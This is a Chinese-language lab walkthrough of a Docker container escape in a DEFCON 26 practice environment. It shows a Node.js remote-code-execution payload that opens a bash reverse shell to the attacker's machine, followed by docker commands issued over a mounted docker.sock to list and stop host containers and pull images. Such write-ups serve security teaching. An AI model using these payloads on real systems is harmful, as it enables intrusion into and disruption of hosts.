# docker安全：不安全的数据卷挂载造成容器逃逸

## 一、**概述**

在这个例子中，容器中的应用存在远程代码执行漏洞。攻击者利用该漏洞获得反弹shell，之后通过通过容器挂载的docker.sock获得访问宿主机的权限。容器所在宿主机：debian 16，192.168.242.135攻击者机器：kali linux 2021，192.168.242.1

实验环境下载：https://sourceforge.net/projects/defcon-26-container-security/

  

## **二、过程**

### 1、 **通过容器中的应用得到反弹****shell**

//访问容器中的应用  
http://192.168.242.135/  
![](../Images/1879f53b2e922fa4ab30590839612f53.png)  
此应用的q参数在GET方法中存在远程代码执行攻击漏洞，攻击者可通过此漏洞获得容器的反弹shell：//攻击者监听本地端口nc -lvp 5555    
//攻击者通过浏览器提交payload：http://192.168.242.135/?q=require("child\_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.242.1/5555 0>%261"')  

![](../Images/e69f79a9f7aab2b42cf812ddc155fb39.png)

  
在终端窗口中得到反弹shell：  

![](../Images/fa58b110ffafb2c41b71a828f1f5cde6.png)

  
已经进入了容器。 

### 2、 **通过容器挂载的****docker.sock****访问宿主机**

ls -l /var/run/docker.sock  //在容器中查看文件信息  

![](../Images/6d35da61ce84bd61e996b7c1e1594770.png)

  
docker守护进程通过/var/run/docker.sock文件来监听客户端发起的连接。这个文件应出现在宿主机中，容器内是不应该出现的。如果出现了，则说明容器启动的时候指定将该文件以数据卷的形式映射到了容器中。如果容器中存在docker客户端程序，则可以通过访问/var/run/docker.sock文件与宿主机的docker守护进程交互。 apt search docker  //在容器内在线搜索docker  
![](../Images/c2879b6fff5ca7afdeb5217a03935c82.png)  
可以在容器中在线安装docker客户端，也可以将docker的二进制程序直接复制到容器中运行。例如将二进制程序传送到容器中的/root/docker目录中。  

![](../Images/ebd2063a6536340460cb18b7224a93dc.png)

  
./docker -H unix:///var/run/docker.sock ps  

![](../Images/dca4054ca806235fcfde0c3e1f4741ae.png)

  
ps命令可以看到宿主机中运行的docker容器。 

### 3、 **针对宿主机和其它容器的攻击**

./docker -H unix:///var/run/docker.sock stop sysmon  //停止宿主机中指定的容器  

![](../Images/fd243a8cdc583d9abf0fdbff2843aaa3.png)

  
./docker -H unix:///var/run/docker.sock pull ubuntu  //拉取镜像  

![](../Images/573d5dd30b01fd3c2fb612462cca32a6.png)

  
./docker -H unix:///var/run/docker.sock images  //查看镜像  

![](../Images/10f5ab4ec34df55dc1410a426301eac3.png)

  
镜像下载成功。之后攻击者可以通过启动自己的镜像发起更多的攻击。
